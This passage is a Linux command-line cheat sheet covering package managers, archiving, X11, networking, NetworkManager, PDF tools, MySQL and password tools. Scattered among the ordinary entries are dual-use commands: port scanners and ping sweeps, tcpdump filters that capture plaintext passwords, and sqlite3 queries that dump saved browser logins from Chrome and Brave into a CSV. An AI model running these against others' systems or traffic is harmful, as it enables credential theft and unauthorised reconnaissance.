($) Compress a file, but don't delete the original: `xz -k file`
($) Compress a file using the fastest compression: `xz -0 file`
($) Compress a file using the best compression: `xz -9 file`

TAR AND COMPRESSION
===================
($) List the contents of a tar file: `tar tvf source.tar`
($) Create an archive from files: `tar cf target.tar file1 file2 file3`
($) Create a gzipped archive from files: `tar czf target.tar.gz file1 file2 file3`
($) Create a gzipped archive from a directory using relative path: `tar czf target.tar.gz --directory=path/to/directory .`
($) Extract a (compressed) archive file into the current directory: `tar xf [source.tar.gz|.bz2|.xz]`
($) Extract a (compressed) archive file into the target directory: `tar xf [source.tar.gz|.bz2|.xz] --directory=directory`
($) Create a compressed archive from files, automatic suffix detection: `tar caf target.tar.xz file1 file2 file3`
($) Extract files matching a pattern: `tar xf source.tar --wildcards "*.html"`
($) Tar and bz2 a set of folders as individual files: `find . -maxdepth 1 -type d -name '*screenflow' -exec tar jcvf {}.tar.bz2 {} \;`
($) Create an uncompressed tar file of each child directory of the current working directory: `find . -maxdepth 1 -mindepth 1 -type d -exec tar cvf {}.tar {}  \;`

($) Zgrep across multiple files: `find . -name "file-pattern*.gz" -exec zgrep -H 'pattern' {} \;`

XORG
====
($) setxkbmap -option compose:ralt
($) Display information about key presses: `showkey -a`
($) Show information about a window by clicking on it: `xwininfo`
($) Send specific key strokes to a window: `xdotool`
($) Fetch specific window properties: `xprop`
($) Output text on to the clipboard: `echo "hello" | xclip -i -sel clip`
($) Get text from the clipboard: `xclip -o -sel clip`
($) List input devices: `xinput list` (e.g. to see Touchpad input on a laptop)
($) Disable touchpad (and possibly add to `.xprofile`): `xinput disable 'SynPS/2 Synaptics TouchPad'`
($) Set RGB gamma of secondary monitor: `secondscreen=$(xrandr -q | grep " connected" | sed -n '2 p' | cut -f 1 -d ' '); [ "$secondscreen" ] && xrandr --output $secondscreen --gamma 0.6:0.75:1`
($) Visual alert with keyboard LEDs: `for a in $(seq 16); do xdotool key Num_Lock;sleep .5; xdotool key Caps_Lock;done`
($) Change the size of a named window: `xdotool search --name "window name" windowsize 300 400`
($) Magnify a mouse-selected part of a screen: `slop | xargs xzoom -source`

MAN
===
($) Print the contents of a help file to stdout instead of pager: `man -Tutf8 networkmanager`
($) List all software that have a man page installed: `ls /usr/share/man/man1 2> /dev/null | sed -e 's/\.1.*//' | xargs whatis 2> /dev/null | sed -e '/unknown subject/d' -e 's/  *- / - /'`

EMERGE, EQUERY, AND FRIENDS
===========================

(#) Sync all repositories that are set to auto-sync including the Gentoo ebuild repository: `emaint --auto sync`
(#) List installed packages with version number and name of overlay used: `qlist -IRv`
($) List what packages would be installed, without installing them (-pv for short): `emerge --pretend --verbose www-client/firefox`
(#) List packages, ask for confirmation, and install a package (-av for short): `emerge --ask --verbose www-client/firefox`
($) List files installed by a package: `equery files --tree gentoolkit`
(#) Install a specific version of a package (an update will override this!) (use "\=" for shells that attach special meaning to the "=" character): `emerge --ask =www-client/firefox-96.0.1`
(#) To prevent Portage from automatically updating a package, add a line into a the /etc/portage/package.mask/package.mask file (create the file if it does not exist). Specify using the greater than operator (>) prefix if it is an older package than latest stable or lesser than operator (<) as a prefix if it is a newer one: `<www-client/firefox-96.0.1`
(#) Install a package without adding it to the world file: `emerge --ask --oneshot www-client/firefox`
(#) Use emerge --deselect (or -W option for short) to remove the specified package from the @world set (i.e. it indicate that the package is no longer wanted): `emerge --deselect www-client/firefox`
(#) If emerge --depclean has not been run in a while, it may try to remove many packages - caution is advised. Once it has been assured that emerge --depclean will only remove unneeded packages, run: `emerge --ask --depclean`
(#) To directly remove a package that no other packages depend on: `emerge --ask --verbose --depclean www-client/firefox`
(#) As a safety measure, depclean will not remove any packages unless all required dependencies have been resolved. As a consequence of this, it is sometimes necessary to first run: `emerge --ask --verbose --update --newuse --deep @world`
(#) Use --changed-use (-U) in place of --newuse (-N) to avoid rebuilds when the only changes are USE flags added to or dropped from the repository. Use the --quiet (-q) flag for more succinct execution: `emerge --ask --quiet --update --changed-use --deep @world`
(#) Upgrade all packages in the world set, their dependencies (--deep), and packages that have USE flag changes (avoiding unnecessary rebuilds when USE changes have no impact): `emerge --ask --verbose --update --deep --changed-use @world`
($) Tell which installed package provides a command using equery: `equery b `which vim``
($) Tell which (not) installed package provides a command using e-file: `e-file vim`
(#) Sometimes it's necessary to rebuild some packages for them to work properly. After installing a new kernel: `emerge @module-rebuild`
(#) Sometimes it's necessary to rebuild some packages for them to work properly. After upgrading to a new version of Go: `emerge @golang-rebuild`
(#) Sometimes it's necessary to rebuild some packages for them to work properly. For using new libraries: `emerge @preserved-rebuild`
(#) Manage configuration changes after an emerge completes: `dispatch-conf`
($) Obtain descriptions and usage of the USE flag X using euse: `euse -i X`
($) Show what packages have the mysql USE flag: `equery hasuse mysql`
($) Show what packages are currently built with the mysql USE flag: `eix --installed-with-use mysql`
($) Show what USE flags are available for a specific package: `equery uses <package-name>`

PACMAN
======
(#) To install a single package or list of packages, including dependencies, issue the following command: `pacman -S package_name1 package_name2 ...`
(#) To install a list of packages with regex (see this forum thread): ` pacman -S $(pacman -Ssq package_regex)`
(#) Sometimes there are multiple versions of a package in different repositories (e.g. extra and testing). To install the version from the extra repository in this example, the repository needs to be defined in front of the package name: `pacman -S extra/package_name`
(#) To install a number of packages sharing similar patterns in their names, one can use curly brace expansion. For example: `pacman -S plasma-{desktop,mediacenter,nm}`
(#) This can be expanded to however many levels needed: `pacman -S plasma-{workspace{,-wallpapers},pa}`

(#) To remove a single package, leaving all of its dependencies installed: `pacman -R package_name`
(#) To remove a package and its dependencies which are not required by any other installed package: `pacman -Rs package_name`
(#) The command `pacman -Rs` may sometimes refuse to run when removing a group which contains otherwise needed packages. In this case try (Warning: When removing a group, such as gnome, this ignores the install reason of the packages in the group, because it acts as though each package in the group is listed separately. Install reason of dependencies is still respected): ` pacman -Rsu package_name`
(#) To remove a package, its dependencies and all the packages that depend on the target package (Warning: This operation is recursive, and must be used with care since it can remove many potentially needed packages): ` pacman -Rsc package_name`
(#) To remove a package, which is required by another package, without removing the dependent package: `pacman -Rdd package_name`
(#) Pacman saves important configuration files when removing certain applications and names them with the extension: .pacsave. To prevent the creation of these backup files use the -n option: `pacman -Rn package_name`

($) Pacman can search for packages in the database, searching both in packages' names and descriptions: `pacman -Ss string1 string2 ...`
($) Sometimes, -s's builtin ERE (Extended Regular Expressions) can cause a lot of unwanted results, so it has to be limited to match the package name only; not the description nor any other field: `pacman -Ss '^vim-'`
($) To search for already installed packages: `pacman -Qs string1 string2 ...`
($) To search for package file names in remote packages: `pacman -F string1 string2 ...`
($) To display extensive information about a given package: `pacman -Si package_name`
($) For locally installed packages: `pacman -Qi package_name`
($) Passing two -i flags will also display the list of backup files and their modification states: `pacman -Qii package_name`
($) To retrieve a list of the files installed by a package: `pacman -Ql package_name`
($) To retrieve a list of the files installed by a remote package: `pacman -Fl package_name`
($) To verify the presence of the files installed by a package: `pacman -Qk package_name`
($) To query the database to know which package a file in the file system belongs to: `pacman -Qo /path/to/file_name`
($) To query the database to know which remote package a file belongs to: `pacman -F /path/to/file_name`
($) To list all packages no longer required as dependencies (orphans): ` pacman -Qdt`
($) To list all packages explicitly installed and not required as dependencies: `pacman -Qet`

(#) Download a package without installing it: `pacman -Sw package_name`
(#) Install a 'local' package that is not from a remote repository (e.g. the package is from the AUR): ` pacman -U /path/to/package/package_name-version.pkg.tar.zst`
(#) To keep a copy of the local package in pacman's cache, use: `pacman -U file:///path/to/package/package_name-version.pkg.tar.zst`
(#) Install a 'remote' package (not from a repository stated in pacman's configuration files): ` pacman -U http://www.example.com/repo/example.pkg.tar.zst`
(#) To remove all the cached packages that are not currently installed, and the unused sync database, execute: `pacman -Sc`
(#) To remove all files from the cache, use the clean switch twice, this is the most aggressive approach and will leave nothing in the cache directory: `pacman -Scc`
(#) Sync the files database: `pacman -Fy`
(#) Search for a package containing a file: `pacman -F gcc`

($) The following command will list all installed packages and their individual sizes: `LC_ALL=C pacman -Qi | awk '/^Name/{name=$3} /^Installed Size/{print $4$5, name}' | sort -h`
($) To list the download size of several packages (leave packages blank to list all packages): `expac -S -H M '%k\t%n' packages`
($) To list explicitly installed packages not in the meta package base nor package group xorg with size and description: `expac -H M "%011m\t%-20n\t%10d" $(comm -23 <(pacman -Qqen | sort) <({ pacman -Qqg xorg; expac -l '\n' '%E' base; } | sort -u)) | sort -n`
($) To list the packages marked for upgrade with their download size: `expac -S -H M '%k\t%n' $(pacman -Qqu) | sort -sh`
($) To list optional dependencies only: `expac -S "%o" package`
($) To list the 20 last installed packages with expac, run: `expac --timefmt='%Y-%m-%d %T' '%l\t%n' | sort | tail -n 20`
($) To list the 20 last installed with seconds since the epoch (1970-01-01 UTC): `expac --timefmt=%s '%l\t%n' | sort -n | tail -n 20`
($) List explicitly installed packages not in the base meta package: `comm -23 <(pacman -Qqe | sort) <(expac -l '\n' '%E' base | sort)`
($) List explicitly installed packages not in the base meta package or xorg package group: `comm -23 <(pacman -Qqe | sort) <({ pacman -Qqg xorg; expac -l '\n' '%E' base; } | sort -u)`
($) List all installed packages unrequired by other packages, and which are not in the base meta package or xorg package group: `comm -23 <(pacman -Qqt | sort) <({ pacman -Qqg xorg; echo base; } | sort -u)`
($) List all installed packages unrequired by other packages, and which are not in the base meta package or xorg package group, but with descriptions: `expac -H M '%-20n\t%10d' $(comm -23 <(pacman -Qqt | sort) <({ pacman -Qqg xorg; echo base; } | sort -u))`
($) List all installed packages that are not in the specified repository repo_name `comm -23 <(pacman -Qq | sort) <(pacman -Sql repo_name | sort)`
($) List all installed packages that are in the repo_name repository: `comm -12 <(pacman -Qq | sort) <(pacman -Sql repo_name | sort)`
($) List all packages on the Arch Linux ISO that are not in the base meta package: `comm -23 <(curl https://gitlab.archlinux.org/archlinux/archiso/-/raw/master/configs/releng/packages.x86_64) <(expac -l '\n' '%E' base | sort)`
($) To list all development/unstable packages, run: `pacman -Qq | grep -Ee '-(bzr|cvs|darcs|git|hg|svn)$'`
($) To obtain the list of the dependencies of a package, the simplest solution is reading the output of: `pacman -Qi package`
($) For automation, instead of the error-prone method of parsing pacman output, use expac: `expac -S '%D' package`
($) To browse all installed packages with an instant preview of each package: `pacman -Qq | fzf --preview 'pacman -Qil {}' --layout=reverse --bind 'enter:execute(pacman -Qil {} | less)'`
($) To browse all packages currently known to pacman (both installed and not yet installed) in a similar way, using fzf, use: `pacman -Slq | fzf --preview 'pacman -Si {}' --layout=reverse`
($) This one might come in handy if you have found that a specific package uses a huge amount of space and you want to find out which files make up the most of that. `pacman -Qlq package | grep -v '/$' | xargs -r du -h | sort -h`
(#) If your system has stray files not owned by any package, you may want to find such files in order to clean them up. `find /etc /usr /opt | LC_ALL=C pacman -Qqo - 2>&1 >&- >/dev/null | cut -d ' ' -f 5-`
(#) For recursively removing orphans and their configuration files: `pacman -Qtdq | pacman -Rns -`
($) For recursively removing orphans and their configuration files with dependency cycles, excessive dependencies, some unexplicit optionals etc.: `pacman -Qqd | pacman -Rsu --print -`

APT
===
($) Update the list of available packages and versions (it's recommended to run this before other `apt` commands): `sudo apt update`
($) Search for a given package: `apt search package`
($) Show information for a package: `apt show package`
($) Install a package, or update it to the latest available version: `sudo apt install package`
($) Remove a package (using `purge` instead also removes its configuration files): `sudo apt remove package`
($) Upgrade all installed packages to their newest available versions: `sudo apt upgrade`
($) List all packages: `apt list`
($) List installed packages: `apt list --installed`
($) Before any Dell Firmware update on Ubuntu, run: `apt install raidcfg dtk-scripts syscfg smbios-utils sfcb cim-schema dcism`
($) Get all upgradable deb packages in a single line: `apt list --upgradable | grep -v 'Listing...' | cut -d/ -f1 | tr '\r\n' ' ' | sed '$s/ $/\n/'`

DPKG
====
($) Rough size estimate of installed debian packages: `echo $[ ($(dpkg-query -s $(dpkg --get-selections | grep -oP '^.*(?=\binstall)') | grep -oP '(?<=Installed-Size: )\d+' | tr '\n' '+' | sed 's/+$//')) / 1024 ]`
($) List the binaries installed by a Debian package: `binaries () { dpkg -L "$1" | grep -Po '.*/bin/\K.*'; }`
($) List the binaries installed by a Debian package: `binaries () { for f in $(dpkg -L "$1" | grep "/bin/"); do basename "$f"; done; }`
($) List all ubuntu installed packages in a single line: `dpkg --get-selections | grep -Evw 'deinstall$' | cut -f1 | sort -u | xargs`
($) List all ubuntu installed packages in a single line: `dpkg --get-selections | grep -v deinstall | sort -u | cut -f 1 | tr '\r\n' ' ' | sed '$s/ $/\n/'`
($) Get the full description of a randomly selected package from the list of installed packages on a debian system: `dpkg-query --status $(dpkg --get-selections | awk '{print NR,$1}' | grep -oP "^$( echo $[ ( ${RANDOM} % $(dpkg --get-selections| wc -l) + 1 ) ] ) \K.*")`
(#) Save a copy of all debian packages in the form in which they are installed and configured on your system: `for a in $(sudo dpkg --get-selections | cut -f1); do dpkg-repack $a | awk '{if (system("sleep .5 && exit 2") != 2) exit; print}';done`
($) List packages manually installed with process currently running: `ps -eo cmd | awk '{print $1}'| sort -u | grep "^/" | xargs dpkg -S 2>/dev/null | awk -F: '{print $1}' | sort -u | xargs apt-mark showmanual`

RPM
===
($) Show version of httpd package: `rpm -q httpd`
($) List versions of all matching packages: `rpm -qa 'mariadb*'`
($) Forcibly install a package regardless of currently installed versions: `rpm -U package_name.rpm --force`
($) Identify owner of a file and show version of the package: `rpm -qf /etc/postfix/main.cf`
($) List package-owned files: `rpm -ql kernel`
($) Show scriptlets from an RPM file: `rpm -qp --scripts package_name.rpm`
($) Show changed, missing and/or incorrectly installed files of matching packages: `rpm -Va 'php-*'`
($) Extract rpm package name, version and release using some fancy sed regex: `rpm -qa | sed 's/^\(.*\)-\([^-]\{1,\}\)-\([^-]\{1,\}\)$/\1 \2 \3/' | sort | column -t`

GENERAL NETWORKING
==================
($) Query my external IP address: `curl -4 https://icanhazip.com`
(#) List processes that are actively using a port: `netstat -tulpn | grep LISTEN`

($) List interfaces with detailed info: `ip a`
($) List interfaces with brief network layer info: `ip -brief address`
($) List interfaces with brief link layer info: `ip -brief link`
($) Display the routing table: `ip route`
($) Show neighbors (ARP table): `ip neighbour`
($) Make an interface up/down: `ip link set interface up/down`
($) Add/Delete an IP address to an interface: `ip addr add/del ip/mask dev interface`
($) Add a default route: `ip route add default via ip dev interface`
($) Show current network interface in use: `ip a | awk '/state UP/ {print $2}' | sed 's/.$//'`
($) Extract all ip addresses from both ip and ifconfig commands output: `ip a | grep -oP '(?<=inet |addr:)(?:\d+\.){3}\d+'`
($) Show your current network interface in use: `ip r show default | awk '{print $5}'`
($) Automatically generate the ip/hostname entry for the /etc/hosts in the current system: `echo "$(ip addr show dev $(ip r | grep -oP 'default.*dev \K\S*') | grep -oP '(?<=inet )[^/]*(?=/)') $(hostname -f) $(hostname -s)"`

($) Block all IPv4 addresses that has brute forcing our ssh server: `for idiots in "$(cat /var/log/auth.log|grep invalid| grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b')"; do iptables -A INPUT -s "$idiots" -j DROP; done`
($) Watch how many tcp connections there are per state every two seconds: `watch -c "netstat -natp 2>/dev/null | tail -n +3 | awk '{print \$6}' | sort | uniq -c"`
($) Watch how many tcp connections there are per state every two seconds: `watch -c "netstat -nt | awk 'FNR > 3 {print \$6}' | sort | uniq -c"`
($) Watch TCP, UDP open ports in real time with socket summary.: `watch ss -stplu`
($) Fast portscanner via xargs: `xargs -i -P 1200 nc -zvn {} 22 < textfile-with-hosts.txt`
($) Check whether IPv6 is enabled: `printf "IPv6 is "; [ $(cat /proc/sys/net/ipv6/conf/all/disable_ipv6) -eq 0 ] && printf "enabled\n" || printf "disabled\n"`

($) Capture SMTP / POP3 Email: `sudo tcpdump -nn -l port 25 | grep -i 'MAIL FROM\|RCPT TO'`
($) Capture FTP Credentials and Commands: `sudo tcpdump -nn -v port ftp or ftp-data`
($) Capture all plaintext passwords: `sudo tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -l -A | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '`
($) Extract HTTP Passwords in POST Requests: `sudo tcpdump -s 0 -A -n -l | egrep -i "POST /|pwd=|passwd=|password=|Host:"`
($) (Powershell) telnet in Windows: `Test-NetConnection -ComputerName example.com -Port 443`

($) Display all TCP sockets: `ss -t -a`
($) Display all TCP sockets with process SELinux security contexts: `ss -t -a -Z`
($) Display all UDP sockets: `ss -u -a`
($) Display all established ssh connections: `ss -o state established '( dport = :ssh or sport = :ssh )'`
($) Find all local processes connected to X server: `ss -x src /tmp/.X11-unix/*`
($) List all the tcp sockets in state FIN-WAIT-1 for our apache to network 193.233.7/24 and look at their timers.: `ss -o state fin-wait-1 '( sport = :http or sport = :https )' dst 193.233.7/24`
($) List sockets in all states from all socket tables but TCP: `ss -a -A 'all,!tcp'`
($) Find all clients connected to HTTP or HTTPS ports: `ss -o state established '( dport = :http or sport = :https )'`
($) Show all current listening programs: `ss -plunt`

($) Get your public IP address using Amazon: `curl checkip.amazonaws.com`
($) Ultra fast public IP address lookup using Cloudflare's 1.1.1.1: `curl -fSs https://1.1.1.1/cdn-cgi/trace | awk -F= '/ip/ { print $2 }'`
($) Download mp3 files linked in a RSS podcast feed: `curl http://radiofrance-podcast.net/podcast09/rss_14726.xml | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*mp3" | sort -u | xargs wget`
($) Offcloud - add a link as remote download: `curl  'https://offcloud.com/api/remote?key=XXXXXX' \   -H 'accept: application/json' \   -H 'Content-Type: application/x-www-form-urlencoded'  --data-raw "url=$MYLINK&remoteOptionId=XXXXX"`
($) Check web server port 80 response header: `curl -I <IPaddress>`
($) Get a list of top 1000 sites from alexa: `curl -qsSl http://s3.amazonaws.com/alexa-static/top-1m.csv.zip 2>/dev/null | zcat | grep ".de$" | head -1000 | awk -F, '{print $2}'`
($) Get Your IP Geographic Location with curl and jq: `curl -s https://ipvigilante.com/$(curl -s https://ipinfo.io/ip) | jq '.data.latitude, .data.longitude, .data.city_name, .data.country_name'`
($) Get current stable kernel version string from kernel.org: `curl -s https://www.kernel.org/releases.json | jq '.latest_stable.version' -r`
($) Check every URL redirect (HTTP status codes 301/302) with curl: `curl -sLkIv --stderr - http://example.org | grep -i location: | awk {'print $3'} | sed '/^$/d'`
($) Check every URL redirect (HTTP status codes 301/302) with curl: `curl -sLkIv --stderr - https://exemple.com | awk 'BEGIN{IGNORECASE = 1};/< location:/ {print $3}'`

($) Download the contents of a URL to a file (named "foo" in this case): `wget https://example.com/foo`
($) Download the contents of a URL to a file (named "bar" in this case): `wget --output-document bar https://example.com/foo`
($) Download a single web page and all its resources with 3-second intervals between requests (scripts, stylesheets, images, etc.): `wget --page-requisites --convert-links --wait=3 https://example.com/somepage.html`
($) Download all listed files within a directory and its sub-directories (does not download embedded page elements): `wget --mirror --no-parent https://example.com/somepath/`
($) Limit the download speed and the number of connection retries: `wget --limit-rate=300k --tries=100 https://example.com/somepath/`
($) Download a file from an HTTP server using Basic Auth (also works for FTP): `wget --user=username --password=password https://example.com`
($) Continue an incomplete download: `wget --continue https://example.com`
($) Download all URLs stored in a text file to a specific directory: `wget --directory-prefix path/to/directory --input-file URLs.txt`
($) Download an entire website: `wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com`
($) Website recursive offline mirror with wget: `wget --mirror --convert-links --adjust-extension --page-requisites  --recursive  --no-parent  www.example.com`
($) Download a single page saved as `wget_result.html`, implementing a custom user-agent: `wget -O wget_result.html --user-agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.58 Safari/537.36" "https://ca.camelcamelcamel.com/search?sq=rk+royal+kludge"`

($) Transfer file from local to remote host: `rsync path/to/local_file remote_host:path/to/remote_directory`
($) Transfer file from remote host to local: `rsync remote_host:path/to/remote_file path/to/local_directory`
($) Transfer files, recursively in archive and compressed mode, verbosely with humanly-readable (partial files ok) progress: `rsync -razvhP path/to/local_file remote_host:path/to/remote_directory`
($) Transfer directory contents (but not the directory itself) from a remote to local: `rsync -r remote_host:path/to/remote_directory/ path/to/local_directory`
($) Transfer a directory [r]ecursively, in [a]rchive to preserve attributes, resolving contained soft[l]inks , and ignoring already transferred files [u]nless newer: `rsync -rauL remote_host:path/to/remote_file path/to/local_directory`
($) Transfer file over SSH and delete local files that do not exist on remote host: `rsync -e ssh --delete remote_host:path/to/remote_file path/to/local_file`
($) Transfer file over SSH using a different port than the default and show global progress: `rsync -e 'ssh -p port' --info=progress2 remote_host:path/to/remote_file path/to/local_file`
($) Transfer using SSH and outputing results to a text file: `rsync --delete --stats -zaAxh -e ssh /local_directory/ username@IP_of_remote:/Remote_Directory/ > /Text_file_Directory/backuplog.txt`
($) Transfer using pem file: `rsync -e 'ssh -i /root/my.pem' -avz /mysql/db/data_summary.* ec2-1-2-4-9.compute-1.amazonaws.com:/mysql/test/`

($) Run a http server in the current directory tree (http://localhost:8080/) : `python -m http.server 8080 && $BROWSER http://localhost:8080`
($) Super fast port scanner: `time seq 65535 | parallel -k --joblog portscan -j9 --pipe --cat -j200% -n9000  --tagstring  '\033[30;3{=$_=++$::color%8=}m'  'nc -vz localhost $(head -n1 {})-$(tail -n1 {})'`
($) Fast ports canner via parallel: `parallel -j200% -n1 -a textfile-with-hosts.txt nc -vz {} ::: 22`

($) Quickly ping range of IP adresses and return only those that are online: `{ for i in {1..254}; do ping -c 1 -W 1  192.168.1.$i & done } | grep "64 bytes"`
($) Scan all open ports without any required program: `for i in {1..65535}; do (echo < /dev/tcp/127.0.0.1/$i) &>/dev/null && printf "\n[+] Open Port at\n: \t%d\n" "$i" || printf "."; done`

TMUX
====
($) Start a new tmux session (attaches immediately): `tmux new -s NAMEOFSESSION`
($) Start a new tmux session, execute command, and detach: `tmux new-session -d -s "NAMEOFSESSION" "htop"`
($) List existing sessions: `tmux ls`
($) Attach to the most recently used session: `tmux attach`
($) Kill a session by name: `tmux kill-session -t NAMEOFSESSION`

($) Detach from the current session (inside a tmux session): `Ctrl-B d`
($) Create a new window (inside a tmux session): `Ctrl-B c`
($) Switch between sessions and windows (inside a tmux session): `Ctrl-B w`

NETWORK MANAGER
===============
($) Tells you whether NetworkManager is running or not: `nmcli -t -f RUNNING general`
($) Shows the overall status of NetworkManager: `nmcli -t -f STATE general`
($) Switches Wi-Fi off: `nmcli radio wifi off`
($) Lists all connections NetworkManager has: `nmcli connection show`
($) Shows all configured connections in multi-line mode: `nmcli -p -m multiline -f all con show`
($) Lists all currently active connections: `nmcli connection show --active`
($) Shows all connection profile names and their auto-connect property: `nmcli -f name,autoconnect c s`
($) Shows details for "My default em1" connection profile: `nmcli -p connection show "My default em1"`
($) Shows details for "My Home Wi-Fi" connection profile with all passwords. Without --show-secrets option, secrets would not be displayed: `nmcli --show-secrets connection show "My Home Wi-Fi"`
($) Shows details for "My default em1" active connection, like IP, DHCP information, etc: `nmcli -f active connection show "My default em1"`
($) Shows static configuration details of the connection profile with "My wired connection" name: `nmcli -f profile con s "My wired connection"`
($) Activates the connection profile with name "My wired connection" on interface eth0. The -p option makes nmcli show progress of the activation: `nmcli -p con up "My wired connection" ifname eth0`
($) Connects the Wi-Fi connection with UUID 6b028a27-6dc9-4411-9886-e9ad1dd43761 to the AP with BSSID 00:3A:98:7C:42:D3: `nmcli con up 6b028a27-6dc9-4411-9886-e9ad1dd43761 ap 00:3A:98:7C:42:D3`
($) Shows the status for all devices: `nmcli device status`
($) Disconnects a connection on interface em2 and marks the device as unavailable for auto-connecting. As a result, no connection will automatically be activated on the device until the device's 'autoconnect' is set to TRUE or the user manually activates a connection: `nmcli dev disconnect em2`
($) Shows details for wlan0 interface; only GENERAL and WIFI-PROPERTIES sections will be shown: `nmcli -f GENERAL,WIFI-PROPERTIES dev show wlan0`
($) Shows all available connection profiles for your Wi-Fi interface wlp3s0: `nmcli -f CONNECTIONS device show wlp3s0`
($) Lists available Wi-Fi access points known to NetworkManager: `nmcli dev wifi`
($) Creates a new connection named "My cafe" and then connects it to "Cafe Hotspot 1" SSID using password "caffeine". This is mainly useful when connecting to "Cafe Hotspot 1" for the first time. Next time, it is better to use nmcli con up id "My cafe" so that the existing connection profile can be used and no additional is created: `nmcli dev wifi con "Cafe Hotspot 1" password caffeine name "My cafe"`
($) Creates a hotspot profile and connects it. Prints the hotspot password the user should use to connect to the hotspot from other devices: `nmcli -s dev wifi hotspot con-name QuickHotspot`
($) Starts IPv4 connection sharing using em1 device. The sharing will be active until the device is disconnected: `nmcli dev modify em1 ipv4.method shared`
($) Temporarily adds an IP address to a device. The address will be removed when the same connection is activated again: `nmcli dev modify em1 ipv6.address 2001:db8::a:bad:c0de`
($) Non-interactively adds an Ethernet connection tied to eth0 interface with automatic IP configuration (DHCP), and disables the connection's autoconnect flag: `nmcli connection add type ethernet autoconnect no ifname eth0`
($) Non-interactively adds a VLAN connection with ID 55. The connection will use eth0 and the VLAN interface will be named Maxipes-fik: `nmcli c a ifname Maxipes-fik type vlan dev eth0 id 55`
($) Non-interactively adds a connection that will use eth0 Ethernet interface and only have an IPv6 link-local address configured: `nmcli c a ifname eth0 type ethernet ipv4.method disabled ipv6.method link-local`
($) Edits existing "ethernet-em1-2" connection in the interactive editor: `nmcli connection edit ethernet-em1-2`
($) Adds a new Ethernet connection in the interactive editor: `nmcli connection edit type ethernet con-name "yet another Ethernet connection"`
($) Modifies 'autoconnect' property in the 'connection' setting of 'ethernet-2' connection: `nmcli con mod ethernet-2 connection.autoconnect no`
($) Modifies 'mtu' property in the 'wifi' setting of 'Home Wi-Fi' connection: `nmcli con mod "Home Wi-Fi" wifi.mtu 1350`
($) Sets manual addressing and the addresses in em1-1 profile: `nmcli con mod em1-1 ipv4.method manual ipv4.addr "192.168.1.23/24 192.168.1.1, 10.10.1.5/8, 10.0.0.11"`
($) Appends a Google public DNS server to DNS servers in ABC profile: `nmcli con modify ABC +ipv4.dns 8.8.8.8`
($) Removes the specified IP address from (static) profile ABC: `nmcli con modify ABC -ipv4.addresses "192.168.100.25/24 192.168.1.1"`
($) Imports an OpenVPN configuration to NetworkManager: `nmcli con import type openvpn file ~/Downloads/frootvpn.ovpn`
($) For more Network Manager examples: `man nmcli-examples`

PANDOC, PDF, GHOSTSCRIPT
========================
($) Convert file to PDF (the output format is determined by file extension): `pandoc input.md -o output.pdf`
($) Force conversion to use a specific format: `pandoc input.docx --to gfm -o output.md`
($) Convert to a standalone file with the appropriate headers/footers (for LaTeX, HTML, etc.): `pandoc input.md -s -o output.tex`
($) Ask pandoc to write out the default template for markdown (useful for expanding and hacking): `pandoc --print-default-template=markdown > template.markdown`
($) List all supported input formats: `pandoc --list-input-formats`
($) List all supported output formats: `pandoc --list-output-formats`

($) Combined two or more PDFs using poppler: `pdfunite one.pdf two.pdf output.pdf`
($) Compress a PDF using ghostscript: `gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.5 -dNOPAUSE -dQUIET -dBATCH -dPrinted=false -sOutputFile=foo-compressed.pdf foo.pdf`)
($) Make a PDF "read-only" (NOT secure, but often effective): `gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -dPDFSETTINGS=/prepress -sOutputFile=main_secure.pdf main.pdf`

MYSQL
=====
($) Mysql status: `mysqladmin status >> /home/status.txt 2>> /home/status_err.txt`
($) InnoDB related parameters: `mysqladmin variables | egrep '(innodb_log_file|innodb_data_file)'`
($) Mysql backup utility: `mysqlbackup --port=3306 --protocol=tcp --user=dba --password=dba  --with-timestamp  --backup-dir=/tmp/toback/ --slave-info backup-and-apply-log  --innodb_data_file_path=ibdata1:10M:autoextend --innodb_log_files_in_group=2 --innodb_log_file_size=5242880`
($) Reapair all mySQL/mariaDB databases: `mysqlcheck --repair --all-databases -u root -p<PASSWORD>`
($) Monitor ETA using pv command: `mysqldump --login-path=mypath sbtest sbtest4 |  pv  --progress  --size  200m  -t  -e  -r  -a > dump.sql`
($) Backup all data in compressed format: `mysqldump --routines --all-databases | gzip > /home/mydata.sql.gz 2> /home/mydata.date '+\%b\%d'.err`
($) Check mysql server performance: `mysqlslap --query=/home/ec2-user/insert.txt --concurrency=123 --iterations=1  --create-schema=test`
($) Check mysql capacity to handle traffic: `mysqlslap  --query=/root/select_query_cp.sql --concurrency=10 --iterations=5  --create-schema=cvts1`

SECURITY AND ENCRYPTION
=======================
($) Calculate the checksum (hash) of a (smallish) file from a URL: `curl -s https://location.com/of/file | sha512sum`
($) After downloading a large file (ISO), compare the md5 checksum: `md5sum -c filename.md5`
($) Command shell generate random strong password: `len=20; tr -dc A-Za-z0-9_ < /dev/urandom | head -c ${len} | xargs`
($) Generate a random password 30 characters long: `tr -c -d "a-zA-Z0-9" </dev/urandom | dd bs=30 count=1 2>/dev/null;echo`
($) Generate cryptographically secure password: `python -c "import string; import random;print(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16)))"`
($) Rename all files in a directory to the md5 hash: `for i in *; do sum=$(md5sum $i); mv  -- "$i" "${sum%% *}"; done`
($) Dump obfuscated passwords from Google Chrome and Chromium.: `sqlite3 -header -csv -separator "," ~/.config/google-chrome/Default/Login\ Data "SELECT * FROM logins" > ~/Passwords.csv`
($) Dump obfuscated passwords from Brave: `sqlite3 -header -csv -separator "," ~/.config/BraveSoftware/Brave-Browser/Default/Login\ Data "SELECT * FROM logins" > ~/Passwords.csv`

PASSWORD STORE
==============
($) Initiate a password-store (requires gpg key): `pass init <same-email-as-full-gen-key>`
($) Allow git to manage the password-store: `pass git init`
($) Insert a new password for somecompany: `pass insert somecompany`
($) Show a password for somecompany: `pass somecompany`
($) Remove a password for somecompany: `pass rm somecompany`
($) Generate a password for mytest of length 10: `pass generate somecompany 10`
($) Copy a password (temporarily) to the clipboard: `pass -c somecompany`
